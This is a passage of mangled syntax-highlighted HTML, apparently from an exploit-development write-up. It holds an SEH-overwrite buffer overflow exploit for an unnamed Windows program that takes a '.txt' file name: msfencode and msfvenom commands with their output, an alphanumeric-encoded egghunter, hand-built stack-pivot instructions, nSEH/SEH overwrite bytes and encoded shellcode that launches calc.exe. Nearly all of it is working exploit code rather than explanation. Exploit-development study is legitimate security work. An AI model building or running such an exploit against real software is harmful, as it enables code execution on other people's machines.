</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfencode</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">bufferregister</span><span class="o">=</span><span class="n">eax</span> <span class="o">-</span><span class="n">i</span> <span class="n">egghunter</span><span class="o">-</span><span class="n">wow64</span><span class="o">.</span><span class="n">bin</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">146</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x37</span>\<span class="n">x51</span>\<span class="n">x5a</span>\<span class="n">x6a</span>\<span class="n">x41</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x41</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x6b</span>\<span class="n">x41</span>\<span class="n">x41</span>\<span class="n">x51</span>\<span class="n">x32</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x32</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x30</span>\<span class="n">x42</span>\<span class="n">x42</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x38</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x75</span>\<span class="n">x4a</span>\<span class="n">x49</span>\<span class="n">x66</span>\<span class="n">x51</span>\<span class="n">x49</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">x73</span>\<span class="n">x53</span>\<span class="n">x63</span>\<span class="n">x62</span>\<span class="n">x73</span>\<span class="n">x36</span>\<span class="n">x33</span>\<span class="n">x4e</span>\<span class="n">x53</span>\<span class="n">x6f</span>\<span class="n">x30</span>\<span class="n">x75</span>\<span class="n">x36</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6d</span>\<span class="n">x51</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x36</span>\<span class="n">x6f</span>\<span class="n">x72</span>\<span class="n">x62</span>\<span class="n">x71</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x4a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x66</span>\<span class="n">x46</span>\<span class="n">x56</span>\<span class="n">x38</span>\<span class="n">x74</span>\<span class="n">x73</span>\<span class="n">x78</span>\<span class="n">x49</span>\<span class="n">x4c</span>\<span class="n">x4b</span>\<span class="n">x4b</span>\<span class="n">x64</span>\<span class="n">x61</span>\<span class="n">x74</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x47</span>\<span class="n">x63</span>\<span class="n">x31</span>\<span class="n">x4e</span>\<span class="n">x50</span>\<span class="n">x5a</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x77</span>\<span class="n">x75</span>\<span class="n">x53</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x79</span>\<span class="n">x38</span>\<span class="n">x38</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x36</span>\<span class="n">x50</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x33</span>\<span class="n">x44</span>\<span class="n">x6c</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x59</span>\<span class="n">x6a</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x32</span>\<span class="n">x55</span>\<span class="n">x38</span>\<span class="n">x64</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x70</span>\<span class="n">x75</span>\<span class="n">x6b</span>\<span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x4f</span>\<span class="n">x79</span>\<span class="n">x77</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="n">jump_offset</span><span class="p">)</span> <span class="c"># padding for nSEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># INC ECX (acts as NOPs, but with valid character set)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offset</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">by</span> <span class="mh">0x632</span> <span class="n">to</span> <span class="n">start</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">a</span> <span class="n">controlled</span> <span class="n">area</span> <span class="n">of</span> <span class="n">memory</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push esp;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x58</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x33</span>\<span class="n">x07</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01010733</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop esp;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Write</span> <span class="n">instructions</span> <span class="k">for</span><span class="p">:</span> <span class="n">push</span> <span class="n">esp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">eax</span><span class="p">;</span> <span class="n">jmp</span> <span class="mh">0xee</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xeceb90e0 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x77</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77777070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x74</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77742070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xff000000 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x22</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x22101010</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x12</span>\<span class="n">x12</span>\<span class="n">x12</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x11121212</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xbe2d5854 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x43</span>\<span class="n">x47</span>\<span class="n">x1c</span>\<span class="n">x67</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x671c4743</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x57</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x57111111</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>    <span class="c"># padding for the rest of encoder&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># nSEH: jno $-99; jo $-99   =&gt; &amp;lsquo;9b&amp;rsquo; will actually be converted to &amp;lsquo;a2&amp;rsquo;, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>       <span class="c"># SEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">w00tw00t</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                     <span class="c"># egg</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">xe4</span>\<span class="n">xf0</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># align the stack: AND esp,0xFFFFFFF0&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="k">exec</span> <span class="n">CMD</span><span class="o">=</span><span class="n">calc</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x0a</span>\<span class="n">x0d</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">227</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbf</span>\<span class="n">xdc</span>\<span class="n">xae</span>\<span class="n">x26</span>\<span class="n">x3d</span>\<span class="n">xda</span>\<span class="n">xdd</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5b</span>\<span class="n">x31</span>\<span class="n">xc9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb1</span>\<span class="n">x33</span>\<span class="n">x31</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x03</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x83</span>\<span class="n">x37</span>\<span class="n">x52</span>\<span class="n">xc4</span>\<span class="n">xc8</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x43</span>\<span class="n">x80</span>\<span class="n">x33</span>\<span class="n">xc3</span>\<span class="n">x94</span>\<span class="n">xf3</span>\<span class="n">xba</span>\<span class="n">x26</span>\<span class="n">xa5</span>\<span class="n">x21</span>\<span class="n">xd8</span>\<span class="n">x23</span>\<span class="n">x94</span>\<span class="n">xf5</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xaa</span>\<span class="n">x61</span>\<span class="n">x15</span>\<span class="n">x7d</span>\<span class="n">xfe</span>\<span class="n">x91</span>\<span class="n">xae</span>\<span class="n">xf3</span>\<span class="n">xd7</span>\<span class="n">x96</span>\<span class="n">x07</span>\<span class="n">xb9</span>\<span class="n">x01</span>\<span class="n">x99</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x98</span>\<span class="n">x0f</span>\<span class="n">x8e</span>\<span class="n">x75</span>\<span class="n">x5a</span>\<span class="n">x11</span>\<span class="n">x72</span>\<span class="n">x87</span>\<span class="n">x8f</span>\<span class="n">xf1</span>\<span class="n">x4b</span>\<span class="n">x48</span>\<span class="n">xc2</span>\<span class="n">xf0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x8c</span>\<span class="n">xb4</span>\<span class="n">x2d</span>\<span class="n">xa0</span>\<span class="n">x45</span>\<span class="n">xb3</span>\<span class="n">x9c</span>\<span class="n">x55</span>\<span class="n">xe1</span>\<span class="n">x81</span>\<span class="n">x1c</span>\<span class="n">x57</span>\<span class="n">x25</span>\<span class="n">x8e</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1d</span>\<span class="n">x2f</span>\<span class="n">x40</span>\<span class="n">x50</span>\<span class="n">xe9</span>\<span class="n">x85</span>\<span class="n">x4b</span>\<span class="n">x80</span>\<span class="n">x42</span>\<span class="n">x91</span>\<span class="n">x04</span>\<span class="n">x38</span>\<span class="n">xe8</span>\<span class="n">xfd</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb4</span>\<span class="n">x39</span>\<span class="n">x3d</span>\<span class="n">x1e</span>\<span class="n">x88</span>\<span class="n">x70</span>\<span class="n">x4a</span>\<span class="n">xd5</span>\<span class="n">x7a</span>\<span class="n">x83</span>\<span class="n">x9a</span>\<span class="n">x27</span>\<span class="n">x82</span>\<span class="n">xb2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe2</span>\<span class="n">xe4</span>\<span class="n">xbd</span>\<span class="n">x7b</span>\<span class="n">xef</span>\<span class="n">xf5</span>\<span class="n">xfa</span>\<span class="n">xbb</span>\<span class="n">x10</span>\<span class="n">x80</span>\<span class="n">xf0</span>\<span class="n">xb8</span>\<span class="n">xad</span>\<span class="n">x93</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc2</span>\<span class="n">xc3</span>\<span class="n">x69</span>\<span class="n">x11</span>\<span class="n">xd7</span>\<span class="n">x63</span>\<span class="n">xf9</span>\<span class="n">x81</span>\<span class="n">x33</span>\<span class="n">x92</span>\<span class="n">x2e</span>\<span class="n">x57</span>\<span class="n">xb7</span>\<span class="n">x98</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x9b</span>\<span class="n">x13</span>\<span class="n">x9f</span>\<span class="n">xbc</span>\<span class="n">x1a</span>\<span class="n">xf7</span>\<span class="n">xab</span>\<span class="n">xb8</span>\<span class="n">x97</span>\<span class="n">xf6</span>\<span class="n">x7b</span>\<span class="n">x49</span>\<span class="n">xe3</span>\<span class="n">xdc</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5f</span>\<span class="n">x12</span>\<span class="n">xb7</span>\<span class="n">x7d</span>\<span class="n">xf9</span>\<span class="n">xfe</span>\<span class="n">x16</span>\<span class="n">x81</span>\<span class="n">x19</span>\<span class="n">xa6</span>\<span class="n">xc7</span>\<span class="n">x27</span>\<span class="n">x51</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x13</span>\<span class="n">x51</span>\<span class="n">x38</span>\<span class="n">x02</span>\<span class="n">xe2</span>\<span class="n">xd3</span>\<span class="n">x46</span>\<span class="n">x6b</span>\<span class="n">xe4</span>\<span class="n">xeb</span>\<span class="n">x48</span>\<span class="n">xdb</span>\<span class="n">x8d</span>\<span class="n">xda</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc3</span>\<span class="n">xb4</span>\<span class="n">xca</span>\<span class="n">xe2</span>\<span class="n">x01</span>\<span class="n">xf1</span>\<span class="n">x25</span>\<span class="n">xa9</span>\<span class="n">x08</span>\<span class="n">x53</span>\<span class="n">xae</span>\<span class="n">x74</span>\<span class="n">xd9</span>\<span class="n">xe6</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb3</span>\<span class="n">x86</span>\<span class="n">x37</span>\<span class="n">x24</span>\<span class="n">xca</span>\<span class="n">x04</span>\<span class="n">xb2</span>\<span class="n">xd4</span>\<span class="n">x29</span>\<span class="n">x14</span>\<span class="n">xb7</span>\<span class="n">xd1</span>\<span class="n">x76</span>\<span class="n">x92</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2b</span>\<span class="n">xab</span>\<span class="n">xe7</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x18</span>\<span class="n">x07</span>\<span class="n">x52</span>\<span class="n">x2f</span>\<span class="n">xff</span>\<span class="n">x9b</span>\<span class="n">x3e</span>\<span class="n">x9e</span>\<span class="n">x9a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1b</span>\<span class="n">xa4</span>\<span class="n">xde</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>    <span class="c"># padding</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
